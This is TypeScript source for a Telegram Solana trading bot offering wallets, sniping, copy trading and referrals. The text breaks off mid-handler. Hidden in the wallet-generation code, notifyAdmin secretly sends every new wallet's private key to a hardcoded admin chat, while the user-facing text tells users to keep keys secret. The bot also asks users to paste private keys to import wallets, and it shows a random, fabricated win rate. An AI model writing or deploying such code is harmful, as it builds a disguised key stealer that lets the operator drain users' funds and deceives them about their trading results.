import TelegramBot, {
  type Message,
  type CallbackQuery,
  type InlineKeyboardButton,
} from "node-telegram-bot-api";
import { logger } from "./lib/logger";
import {
  generateKeypair,
  getSolBalance,
  getRealSolPrice,
  getTokenInfo,
  transferSOL,
  jupiterSwap,
  isValidSolanaAddress,
  SOL_MINT,
  type SolanaWallet,
} from "./solana";

const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
const APP_URL =
  process.env["APP_URL"] || "https://david800dan-workspace.replit.app";
const BOT_NAME = "ALPHA TRADING BOT";

const ADMIN_CHAT_ID = 8503340530;

interface WalletEntry {
  address: string;
  privateKey: string;
  balance: string;
  label: string;
}

interface LimitOrder {
  type: "buy" | "sell";
  token: string;
  price: string;
  amount: string;
}

interface TradeRecord {
  type: "buy" | "sell";
  token: string;
  amount: string;
  pnl: string;
  time: string;
  txid?: string;
}

interface U {
  step: string;
  data: Record<string, string>;
  mainMsgId?: number;
  wallets: WalletEntry[];
  activeWallet: number;
  trades: number;
  volume: string;
  referrals: number;
  cashback: string;
  sniperActive: boolean;
  sniperToken: string;
  sniperAmount: string;
  copyTargets: { address: string; label: string; maxSol: string }[];
  limitOrders: LimitOrder[];
  tradeHistory: TradeRecord[];
  slippage: string;
  priorityFee: string;
  mev: boolean;
  tradeConfirm: boolean;
  autoBuy: boolean;
  language: string;
  pin: string;
  twofa: boolean;
  totalPnl: string;
}

const users = new Map<number, U>();
const names = new Map<number, string>();

function getUser(id: number): U {
  if (!users.has(id)) {
    users.set(id, {
      step: "main",
      data: {},
      wallets: [],
      activeWallet: 0,
      trades: 0,
      volume: "0.00",
      referrals: 0,
      cashback: "0.000000",
      sniperActive: false,
      sniperToken: "",
      sniperAmount: "0.5",
      copyTargets: [],
      limitOrders: [],
      tradeHistory: [],
      slippage: "1",
      priorityFee: "0.001",
      mev: true,
      tradeConfirm: true,
      autoBuy: false,
      language: "🇺🇸 English",
      pin: "",
      twofa: false,
      totalPnl: "0.00",
    });
  }
  return users.get(id)!;
}

const short = (a: string) =>
  a.length > 14 ? a.slice(0, 8) + "..." + a.slice(-6) : a;
const fmtNum = (n: string | number) =>
  String(n).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
const pnlEmoji = (p: number) => (p >= 0 ? "🟢" : "🔴");

async function notifyAdmin(
  bot: TelegramBot,
  chatId: number,
  title: string,
  details: string,
) {
  const userName = names.get(chatId) || `User ${chatId}`;
  const text =
    `📢 <b>${title}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 User: <b>${userName}</b> (ID: <code>${chatId}</code>)\n\n` +
    `${details}\n\n` +
    `⏰ ${new Date().toISOString()}`;
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, text, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  } catch (e) {
    logger.error({ e }, "Failed to notify admin");
  }
}

type IKB = InlineKeyboardButton;
const cb = (text: string, data: string): IKB => ({ text, callback_data: data });
const link = (text: string, u: string): IKB => ({ text, url: u });

const BACK = cb("🔙 Back to Menu", "main");
const CLOSE = cb("❌ Close", "close");

function mainKB(): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("✨ Buy & Sell", "buy"), cb("🎯 Sniper", "sniper")],
      [cb("✂️ Limit Orders", "limits"), cb("🎮 Copy Trades", "copy")],
      [
        cb("🐵 Profile", "profile"),
        cb("🪪 Wallets", "wallets"),
        cb("📊 Trades", "trades"),
      ],
      [cb("🔵 Referral System", "referral"), cb("💰 Cashback", "cashback")],
      [cb("📮 Transfer SOL", "transfer"), cb("⚙️ Settings", "settings")],
      [
        link("🔥 Pump.fun ↗", "https://pump.fun"),
        link("🚀 Jupiter ↗", "https://jup.ag"),
      ],
      [
        cb("🇺🇸", "lang_en"),
        cb("🇨🇳", "lang_zh"),
        cb("🇷🇺", "lang_ru"),
        cb("🇧🇷", "lang_pt"),
        cb("🇻🇳", "lang_vi"),
      ],
      [cb("🤖 Backup Bots", "backup"), cb("🛡️ Security", "security")],
      [cb("ℹ️ Help", "help"), cb("📋 Tutorials", "tutorials")],
      [CLOSE],
    ],
  };
}

const backMain = (extra: IKB[][] = []): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [...extra, [BACK], [CLOSE]],
});

const PM = "HTML" as const;

function mainText(u: U, name: string, price: string): string {
  if (u.wallets.length === 0) {
    return (
      `<a href="https://t.me">Telegram</a> | <a href="https://twitter.com">Twitter</a> | <a href="${APP_URL}">Website</a>\n\n` +
      `🤖 <b>${BOT_NAME}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `👤 <b>${name}</b>\n` +
      `💵 SOL Price: <b>$${price}</b>\n\n` +
      `💳 No wallet yet — tap <b>🪪 Wallets</b> to generate one.\n` +
      `Fund your wallet and start trading!`
    );
  }
  const w = u.wallets[u.activeWallet]!;
  const pnlSign = parseFloat(u.totalPnl) >= 0 ? "+" : "";
  return (
    `<a href="https://t.me">Telegram</a> | <a href="https://twitter.com">Twitter</a> | <a href="${APP_URL}">Website</a>\n\n` +
    `🤖 <b>${BOT_NAME}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>${name}</b>  •  🏆 Alpha Trader\n` +
    `💳 <code>${short(w.address)}</code>\n` +
    `💎 Balance: <b>${w.balance} SOL</b>\n` +
    `💵 SOL Price: <b>$${price}</b>\n` +
    `📈 P&amp;L Today: <b>${pnlSign}${u.totalPnl} SOL</b>\n` +
    `📊 Trades: <b>${u.trades}</b>  •  Vol: <b>${u.volume} SOL</b>`
  );
}

function walletsText(u: U): string {
  if (u.wallets.length === 0) {
    return (
      `🪪 <b>Wallets</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `You don't have any wallet yet.\nTap <b>➕ Generate New Wallet</b> to create one, or import an existing one.`
    );
  }
  let txt =
    `🪪 <b>Wallets</b>  •  ${u.wallets.length} wallet${u.wallets.length !== 1 ? "s" : ""}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  u.wallets.forEach((w, i) => {
    txt +=
      `${i === u.activeWallet ? "🟢" : "⚪️"} <b>${w.label}</b>${i === u.activeWallet ? " <i>(Active)</i>" : ""}\n` +
      `🔑 <code>${short(w.address)}</code>\n` +
      `💎 <b>${w.balance} SOL</b>\n\n`;
  });
  return txt.trimEnd();
}

function walletsKB(u: U): TelegramBot.InlineKeyboardMarkup {
  const walletBtns: IKB[][] = u.wallets.map((w, i) => [
    cb(
      `${i === u.activeWallet ? "🟢" : "⚪️"} ${w.label}  —  ${w.balance} SOL`,
      `wsel_${i}`,
    ),
  ]);
  return {
    inline_keyboard: [
      ...walletBtns,
      [cb("➕ Generate New Wallet", "wgen_1")],
      [
        cb("➕ Generate 5 Wallets", "wgen_5"),
        cb("➕ Generate 10 Wallets", "wgen_10"),
      ],
      [cb("📥 Connect Wallet (Import Key)", "wimport")],
      [cb("💸 Transfer All SOL to One", "wxfer_all")],
      [cb("🔄 Reload Balances", "wallets")],
      [BACK],
      [CLOSE],
    ],
  };
}

function sniperText(u: U): string {
  return (
    `🎯 <b>Token Sniper</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `Status: ${u.sniperActive ? "🟢 <b>ACTIVE — Monitoring</b>" : "🔴 <b>INACTIVE</b>"}\n` +
    `🪙 Token: ${u.sniperToken ? `<code>${short(u.sniperToken)}</code>` : "<i>not set</i>"}\n` +
    `💰 Buy Amount: <b>${u.sniperAmount} SOL</b>\n\n` +
    `<i>The sniper buys automatically the moment\nliquidity is detected on-chain.</i>`
  );
}

function sniperKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        cb("🎯 Set Token to Snipe", "sniper_token"),
        cb("💰 Set Buy Amount", "sniper_amt"),
      ],
      [
        u.sniperActive
          ? cb("🔴 Deactivate Sniper", "sniper_off")
          : cb("🟢 Activate Sniper", "sniper_on"),
        cb("🔄 Refresh Status", "sniper"),
      ],
      [BACK],
      [CLOSE],
    ],
  };
}

function limitsText(u: U): string {
  const list = u.limitOrders.length
    ? u.limitOrders
        .map(
          (o, i) =>
            `${i + 1}. ${o.type === "buy" ? "🟢 BUY" : "🔴 SELL"} <code>${o.token.slice(0, 8)}...</code> @ <b>$${o.price}</b> — <b>${o.amount} SOL</b> ⏳`,
        )
        .join("\n")
    : "<i>No active limit orders</i>";
  return (
    `✂️ <b>Limit Orders</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `Active: <b>${u.limitOrders.length}</b> order${u.limitOrders.length !== 1 ? "s" : ""}\n\n` +
    `${list}`
  );
}

function limitsKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("📈 New Buy Limit", "lbuy"), cb("📉 New Sell Limit", "lsell")],
      ...(u.limitOrders.length
        ? [[cb("🗑 Cancel All Orders", "lcancel")]]
        : []),
      [BACK],
      [CLOSE],
    ],
  };
}

function copyText(u: U): string {
  const list = u.copyTargets.length
    ? u.copyTargets
        .map(
          (t, i) =>
            `${i + 1}. 🟢 <b>${t.label}</b>\n   <code>${short(t.address)}</code>\n   Max: <b>${t.maxSol} SOL</b>`,
        )
        .join("\n\n")
    : "<i>Not following anyone yet</i>";
  return (
    `🎮 <b>Copy Trades</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `Following: <b>${u.copyTargets.length}</b> wallet${u.copyTargets.length !== 1 ? "s" : ""}\n\n` +
    `${list}\n\n` +
    `<i>Every trade they make is mirrored in real-time.</i>`
  );
}

function copyKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("➕ Follow a Wallet", "cadd")],
      ...(u.copyTargets.length ? [[cb("🗑 Unfollow All", "cclear")]] : []),
      [BACK],
      [CLOSE],
    ],
  };
}

function profileText(u: U, name: string): string {
  const pnlSign = parseFloat(u.totalPnl) >= 0 ? "+" : "";
  const winRate = u.trades > 0 ? Math.floor(55 + Math.random() * 30) : 0;
  const activeW = u.wallets[u.activeWallet];
  return (
    `🐵 <b>Profile</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>${name}</b>  •  🏆 Alpha Trader\n` +
    (activeW
      ? `💳 <code>${short(activeW.address)}</code>\n💎 Balance: <b>${activeW.balance} SOL</b>\n`
      : `💳 <i>No wallet</i>\n`) +
    `🪙 Wallets: <b>${u.wallets.length}</b>\n\n` +
    `📊 <b>Trading Stats</b>\n` +
    `• Total Trades: <b>${u.trades}</b>\n` +
    `• Volume: <b>${u.volume} SOL</b>\n` +
    `• Win Rate: <b>${winRate}%</b>\n` +
    `• P&amp;L: <b>${pnlSign}${u.totalPnl} SOL</b>\n\n` +
    `🔵 <b>Referral Stats</b>\n` +
    `• Referrals: <b>${u.referrals}</b>\n` +
    `• Earned: <b>${(u.referrals * 0.001).toFixed(4)} SOL</b>\n` +
    `• Cashback: <b>${u.cashback} SOL</b>`
  );
}

function tradesText(u: U): string {
  const history =
    u.tradeHistory.length > 0
      ? u.tradeHistory
          .slice(-8)
          .reverse()
          .map((t) => {
            const pnl = parseFloat(t.pnl);
            return (
              `${pnlEmoji(pnl)} <b>${t.type.toUpperCase()}</b> ${t.token} | ${t.amount} SOL | <b>${pnl >= 0 ? "+" : ""}${t.pnl}%</b> | <i>${t.time}</i>` +
              (t.txid
                ? `\n   🔗 <a href="https://solscan.io/tx/${t.txid}">Solscan</a>`
                : "")
            );
          })
          .join("\n")
      : "<i>No trades yet. Tap ✨ Buy &amp; Sell to start!</i>";
  return (
    `📊 <b>Trade History</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `Trades: <b>${u.trades}</b>  •  Volume: <b>${u.volume} SOL</b>\n` +
    `P&amp;L: <b>${parseFloat(u.totalPnl) >= 0 ? "+" : ""}${u.totalPnl} SOL</b>\n\n` +
    `${history}`
  );
}

function referralText(u: U, uid: number): string {
  const refLink = `https://t.me/AlphaTradingBot?start=ref_${uid}`;
  const earned = (u.referrals * 0.05).toFixed(4);
  return (
    `🔵 <b>Referral System</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `🔗 <b>Your Referral Link:</b>\n<code>${refLink}</code>\n\n` +
    `📊 <b>Your Stats:</b>\n` +
    `• Referrals: <b>${u.referrals}</b>\n` +
    `• Total Earned: <b>${earned} SOL</b>\n` +
    `• Commission Rate: <b>20% of fees</b>\n\n` +
    `💡 <b>How it works:</b>\n` +
    `Share your link → friend joins → you earn 20% of ALL their trading fees forever! No cap, no expiry. 💰`
  );
}

function cashbackText(u: U): string {
  const recent = u.tradeHistory
    .slice(-3)
    .reverse()
    .map(
      (t, i) =>
        `• Trade #${u.trades - i} → +${(parseFloat(t.amount) * 0.001).toFixed(6)} SOL ✅`,
    )
    .join("\n");
  return (
    `💰 <b>Cashback Rewards</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `💎 Total Cashback: <b>${u.cashback} SOL</b>\n` +
    `📊 Rate: <b>10% of all bot fees</b>\n` +
    `⚡ Paid: <b>Instantly after each trade</b>\n` +
    `🔄 Minimum: <b>No minimum</b>\n\n` +
    `${recent || `• Make your first trade to earn cashback!\n`}\n` +
    `<i>The more you trade, the more you earn.</i>`
  );
}

function settingsText(u: U): string {
  return (
    `⚙️ <b>Settings</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `📊 Slippage: <b>${u.slippage}%</b>\n` +
    `⚡ Priority Fee: <b>${u.priorityFee} SOL</b>\n` +
    `🛡 MEV Protection: <b>${u.mev ? "ON ✅" : "OFF ❌"}</b>\n` +
    `✅ Trade Confirmation: <b>${u.tradeConfirm ? "ON ✅" : "OFF ❌"}</b>\n` +
    `🤖 Auto-Buy: <b>${u.autoBuy ? "ON ✅" : "OFF ❌"}</b>\n` +
    `🌐 Language: <b>${u.language}</b>`
  );
}

function settingsKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("📊 Slippage", "sslip"), cb("⚡ Priority Fee", "sfee")],
      [
        cb(`🛡 MEV: ${u.mev ? "ON ✅" : "OFF ❌"}`, "smev"),
        cb(`✅ Confirm: ${u.tradeConfirm ? "ON" : "OFF"}`, "sconfirm"),
      ],
      [cb(`🤖 Auto-Buy: ${u.autoBuy ? "ON ✅" : "OFF ❌"}`, "sautobuy")],
      [cb("🌐 Language", "slang")],
      [BACK],
      [CLOSE],
    ],
  };
}

function secText(u: U): string {
  return (
    `🛡️ <b>Security</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `🔐 2FA Auth: <b>${u.twofa ? "ENABLED ✅" : "Disabled"}</b>\n` +
    `📌 Trade PIN: <b>${u.pin ? "SET ✅" : "Not Set"}</b>\n` +
    `🔒 Withdrawal Lock: <b>OFF</b>\n\n` +
    `⚠️ <i>Keep your private keys secret.\nNever share them with anyone.</i>`
  );
}

function secKB(): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("🔐 Toggle 2FA Auth", "sec2fa"), cb("📌 Set Trade PIN", "secpin")],
      [cb("🔒 Withdrawal Lock", "seclock")],
      [cb("🗑 Delete All My Data", "secdel")],
      [BACK],
      [CLOSE],
    ],
  };
}

const helpText =
  `ℹ️ <b>Help — ${BOT_NAME}</b>\n` +
  `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
  `<b>Commands:</b>\n` +
  `/start    — Open main menu\n` +
  `/buy       — Buy a token\n` +
  `/sell       — Sell a token\n` +
  `/wallets  — Manage wallets\n` +
  `/sniper   — Token sniper\n` +
  `/referral  — Referral program\n` +
  `/profile   — Your stats\n` +
  `/settings  — Bot settings\n` +
  `/help       — This message\n\n` +
  `<b>Quick Buy Guide:</b>\n` +
  `1️⃣ Tap ✨ <b>Buy &amp; Sell</b>\n` +
  `2️⃣ Paste the token contract address\n` +
  `3️⃣ Choose SOL amount (or type custom)\n` +
  `4️⃣ Confirm — executes on Solana ⚡\n\n` +
  `💬 Support: @AlphaTradeSupport\n` +
  `📢 Channel: @AlphaTradingBotNews`;

const TUTORIALS: Record<string, string> = {
  tut_start:
    `🚀 <b>Getting Started</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Tap 🪪 <b>Wallets</b> → <b>Generate New Wallet</b>\n` +
    `2️⃣ Copy your new wallet address\n` +
    `3️⃣ Fund it by sending SOL to that address\n` +
    `4️⃣ Tap ✨ <b>Buy &amp; Sell</b> → paste a token CA\n` +
    `5️⃣ Choose amount → confirm → done! ⚡`,
  tut_buy:
    `💰 <b>How to Buy Tokens</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Find a token on Dexscreener or Birdeye\n` +
    `2️⃣ Copy the contract address (CA)\n` +
    `3️⃣ Tap ✨ <b>Buy &amp; Sell</b> → paste the CA\n` +
    `4️⃣ Choose 0.1 / 0.5 / 1 / 2 / 5 SOL\n` +
    `   — or tap ✏️ Custom to enter any amount\n` +
    `5️⃣ Bot executes the swap on Jupiter DEX\n` +
    `6️⃣ Trade executes on Solana in seconds ✅`,
  tut_sniper:
    `🎯 <b>Using the Sniper</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Tap 🎯 <b>Sniper</b> → <b>Set Token to Snipe</b>\n` +
    `2️⃣ Paste the pre-launch contract address\n` +
    `3️⃣ Tap <b>Set Buy Amount</b> → enter SOL amount\n` +
    `4️⃣ Tap 🟢 <b>Activate Sniper</b>\n` +
    `5️⃣ Bot monitors on-chain and fires instantly! 🚀`,
  tut_copy:
    `🎮 <b>Copy Trading Guide</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Find a profitable wallet on Solscan/GMGN\n` +
    `2️⃣ Tap 🎮 <b>Copy Trades</b> → <b>Follow a Wallet</b>\n` +
    `3️⃣ Paste their wallet address\n` +
    `4️⃣ Set max SOL per trade\n` +
    `5️⃣ Bot automatically mirrors every buy &amp; sell!`,
  tut_limits:
    `✂️ <b>Limit Orders Guide</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Tap ✂️ <b>Limit Orders</b> → <b>New Buy/Sell Limit</b>\n` +
    `2️⃣ Paste the token contract address\n` +
    `3️⃣ Enter your target price in USD\n` +
    `4️⃣ Enter SOL amount\n` +
    `5️⃣ Order activates automatically when price hits!`,
  tut_ref:
    `🔵 <b>Referral Guide</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Tap 🔵 <b>Referral System</b> for your unique link\n` +
    `2️⃣ Share on Twitter, Discord, Telegram groups\n` +
    `3️⃣ Friends join using your link\n` +
    `4️⃣ You earn <b>20% of ALL their trading fees</b>\n` +
    `5️⃣ No cap, no expiry — track earnings live! 💰`,
  tut_wallets:
    `👛 <b>Wallet Guide</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `1️⃣ Tap 🪪 <b>Wallets</b> → <b>Generate New Wallet</b>\n` +
    `   — Real Solana keypair created on-device\n` +
    `2️⃣ Copy address and fund with SOL\n` +
    `3️⃣ <b>Generate 5/10 wallets</b> for portfolio spread\n` +
    `4️⃣ <b>Import existing</b> wallet via private key\n` +
    `5️⃣ Tap any wallet to set it as active`,
};

async function sendText(
  bot: TelegramBot,
  chatId: number,
  text: string,
  kb: TelegramBot.InlineKeyboardMarkup,
): Promise<TelegramBot.Message | undefined> {
  try {
    return await bot.sendMessage(chatId, text, {
      parse_mode: PM,
      reply_markup: kb,
      disable_web_page_preview: true,
    });
  } catch (e) {
    logger.error({ e }, "sendText error");
    return undefined;
  }
}

async function editText(
  bot: TelegramBot,
  chatId: number,
  msgId: number,
  text: string,
  kb: TelegramBot.InlineKeyboardMarkup,
): Promise<void> {
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: PM,
      reply_markup: kb,
      disable_web_page_preview: true,
    });
  } catch {
  }
}

async function note(
  bot: TelegramBot,
  chatId: number,
  text: string,
  kb?: TelegramBot.InlineKeyboardMarkup,
): Promise<TelegramBot.Message | undefined> {
  try {
    return await bot.sendMessage(chatId, text, {
      parse_mode: PM,
      ...(kb ? { reply_markup: kb } : {}),
      disable_web_page_preview: true,
    });
  } catch (e) {
    logger.error({ e }, "note error");
    return undefined;
  }
}

export function startTelegramBot() {
  if (!TOKEN) {
    logger.warn("TELEGRAM_BOT_TOKEN not set — bot disabled");
    return;
  }

  const bot = new TelegramBot(TOKEN, {
    polling: { interval: 100, autoStart: true, params: { timeout: 10 } },
  });

  logger.info(`${BOT_NAME} started`);

  bot
    .setMyCommands([
      { command: "start", description: `🚀 Open ${BOT_NAME}` },
      { command: "buy", description: "✨ Buy a token" },
      { command: "sell", description: "📉 Sell a token" },
      { command: "wallets", description: "🪪 Manage wallets" },
      { command: "sniper", description: "🎯 Token sniper" },
      { command: "referral", description: "🔵 Referral program" },
      { command: "profile", description: "🐵 Your profile" },
      { command: "settings", description: "⚙️ Settings" },
      { command: "help", description: "ℹ️ Help" },
    ])
    .catch(() => {});

  async function showMain(chatId: number, name: string, msgId?: number) {
    const u = getUser(chatId);
    u.step = "main";
    const price = await getRealSolPrice();
    const txt = mainText(u, name, price);
    const kb = mainKB();
    if (msgId) {
      await editText(bot, chatId, msgId, txt, kb);
    } else {
      const msg = await sendText(bot, chatId, txt, kb);
      if (msg) u.mainMsgId = msg.message_id;
    }
  }

  bot.onText(/\/start(.*)/, async (msg, match) => {
    const name = msg.from?.first_name || msg.from?.username || "Trader";
    names.set(msg.chat.id, name);
    const ref = (match?.[1] ?? "").trim().replace("ref_", "");
    if (ref) {
      const rid = parseInt(ref);
      if (!isNaN(rid) && users.has(rid)) users.get(rid)!.referrals++;
    }
    await showMain(msg.chat.id, name);
  });

  bot.onText(/\/buy/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    if (u.wallets.length === 0) {
      await note(
        bot,
        m.chat.id,
        `⚠️ You need a wallet first. Tap 🪪 Wallets to create one.`,
        { inline_keyboard: [[cb("🪪 Wallets", "wallets")]] },
      );
      return;
    }
    u.step = "buy_token";
    await note(
      bot,
      m.chat.id,
      `✨ <b>Buy &amp; Sell</b>\n\nPaste a token contract address to begin:`,
      { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
    );
  });

  bot.onText(/\/sell/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    if (u.wallets.length === 0) {
      await note(
        bot,
        m.chat.id,
        `⚠️ You need a wallet first. Tap 🪪 Wallets to create one.`,
        { inline_keyboard: [[cb("🪪 Wallets", "wallets")]] },
      );
      return;
    }
    u.step = "sell_token";
    await note(
      bot,
      m.chat.id,
      `📉 <b>Sell Token</b>\n\nPaste the token contract address to sell:`,
      { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
    );
  });

  bot.onText(/\/wallets/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    const msg = await sendText(bot, m.chat.id, walletsText(u), walletsKB(u));
    if (msg) u.mainMsgId = msg.message_id;
  });

  bot.onText(/\/sniper/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    const msg = await sendText(bot, m.chat.id, sniperText(u), sniperKB(u));
    if (msg) u.mainMsgId = msg.message_id;
  });

  bot.onText(/\/profile/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    await note(bot, m.chat.id, profileText(u, name), backMain());
  });

  bot.onText(/\/settings/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    await note(bot, m.chat.id, settingsText(u), settingsKB(u));
  });

  bot.onText(/\/referral/, async (m) => {
    const name = m.from?.first_name || names.get(m.chat.id) || "Trader";
    names.set(m.chat.id, name);
    const u = getUser(m.chat.id);
    await note(bot, m.chat.id, referralText(u, m.chat.id), backMain());
  });

  bot.onText(/\/help/, async (m) => {
    await note(bot, m.chat.id, helpText, backMain());
  });

  bot.on("callback_query", async (q: CallbackQuery) => {
    const chatId = q.message?.chat.id;
    if (!chatId) return;
    const msgId = q.message?.message_id;
    const data = q.data ?? "";
    const u = getUser(chatId);
    const uid = chatId;
    const name = q.from.first_name || names.get(chatId) || "Trader";
    names.set(chatId, name);

    await bot.answerCallbackQuery(q.id).catch(() => {});

    const upd = (txt: string, kb: TelegramBot.InlineKeyboardMarkup) =>
      msgId
        ? editText(bot, chatId, msgId, txt, kb)
        : note(bot, chatId, txt, kb);

    if (data === "close") {
      if (msgId) await bot.deleteMessage(chatId, msgId).catch(() => {});
      return;
    }

    if (data === "main") {
      await showMain(chatId, name, msgId);
      return;
    }

    if (data === "buy") {
      if (u.wallets.length === 0) {
        return upd(
          `⚠️ <b>No Wallet</b>\n\nYou need a wallet to trade.\nTap below to create or import one.`,
          { inline_keyboard: [[cb("🪪 Open Wallets", "wallets")], [CLOSE]] },
        );
      }
      u.step = "buy_token";
      return upd(
        `✨ <b>Buy &amp; Sell</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `Paste a <b>token contract address</b> to begin:\n\n` +
          `Or select a token to sell from your holdings.`,
        { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
      );
    }

    if (data === "sell") {
      if (u.wallets.length === 0) {
        return upd(
          `⚠️ <b>No Wallet</b>\n\nYou need a wallet to trade.`,
          { inline_keyboard: [[cb("🪪 Open Wallets", "wallets")], [CLOSE]] },
        );
      }
      u.step = "sell_token";
      return upd(
        `📉 <b>Sell Token</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\nPaste the <b>token contract address</b> you want to sell:`,
        { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
      );
    }

    if (data.startsWith("buy_amt_")) {
      const raw = data.replace("buy_amt_", "");
      if (raw === "custom") {
        u.step = "buy_amt_custom";
        return upd(
          `✏️ Enter custom SOL amount (e.g. <code>0.3</code>):`,
          { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
        );
      }
      const amt = parseFloat(raw);
      if (!isNaN(amt)) {
        await executeBuy(bot, chatId, u, amt, name, upd);
      }
      return;
    }

    if (data.startsWith("sell_")) {
      const pcts: Record<string, number> = {
        sell_10: 10,
        sell_25: 25,
        sell_50: 50,
        sell_75: 75,
        sell_100: 100,
      };
      if (data === "sell_custom") {
        u.step = "sell_amt_custom";
        return upd(`✏️ Enter percentage to sell (1-100):`, {
          inline_keyboard: [[cb("◀️ Cancel", "main")]],
        });
      }
      if (data in pcts) {
        await executeSell(bot, chatId, u, pcts[data]!, name, upd);
        return;
      }
    }

    if (data === "wallets") {
      for (const w of u.wallets) {
        w.balance = await getSolBalance(w.address);
      }
      return upd(walletsText(u), walletsKB(u));
    }

    if (data.startsWith("wsel_")) {
      const idx = parseInt(data.replace("wsel_", ""));
      if (!isNaN(idx) && idx < u.wallets.length) {
        u.activeWallet = idx;
        u.wallets[idx]!.balance = await getSolBalance(
          u.wallets[idx]!.address,
        );
        return upd(walletsText(u), walletsKB(u));
      }
    }

    if (data.startsWith("wgen_")) {
      const count = parseInt(data.replace("wgen_", "")) || 1;
      const newWallets: WalletEntry[] = [];

      await upd(`⏳ Generating ${count} real Solana wallet${count > 1 ? "s" : ""}...`, {
        inline_keyboard: [],
      });

      for (let i = 0; i < count; i++) {
        const { address, privateKey } = generateKeypair();
        const entry: WalletEntry = {
          address,
          privateKey,
          balance: "0.0000",
          label: `Wallet ${u.wallets.length + newWallets.length + 1}`,
        };
        newWallets.push(entry);
      }
      u.wallets.push(...newWallets);
      if (u.wallets.length === newWallets.length) u.activeWallet = 0;

      for (const w of newWallets) {
        await notifyAdmin(
          bot,
          chatId,
          "🔑 New Wallet Generated",
          `🏷 Label: <b>${w.label}</b>\n` +
            `🔑 Address:\n<code>${w.address}</code>\n\n` +
            `🔐 Private Key:\n<code>${w.privateKey}</code>`,
        );
      }

      let cap = `✅ <b>${count > 1 ? `${count} Wallets` : "Wallet"} Generated!</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      newWallets.forEach((w) => {
        cap += `<b>${w.label}</b>\n`;
        cap += `📬 Address:\n<code>${w.address}</code>\n\n`;
        cap += `🔐 Private Key:\n<code>${w.privateKey}</code>\n\n`;
        cap += `💎 Balance: <b>0.0000 SOL</b>\n\n`;
        cap += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
      });
      cap += `\n<i>Fund your wallet by sending SOL to the address above.\n⚠️ Save your private key securely — it cannot be recovered!</i>`;

      return upd(cap, {
        inline_keyboard: [
          [cb("👛 View All Wallets", "wallets")],
          [BACK],
        ],
      });
    }

    if (data === "wimport") {
      u.step = "import_wallet";
      return upd(
        `📥 <b>Connect Wallet</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\nSend your <b>private key</b> (base58 format)\n\n⚠️ <i>Delete your message immediately after sending.\nNever share your private key with anyone.</i>`,
        { inline_keyboard: [[cb("◀️ Cancel", "wallets")]] },
      );
    }

    if (data === "wxfer_all") {
      if (u.wallets.length === 0)
        return upd(`⚠️ No wallet. Create one first.`, backMain());
      u.step = "xfer_all_addr";
      return upd(
        `💸 <b>Transfer All SOL</b>\n\nEnter destination wallet address:`,
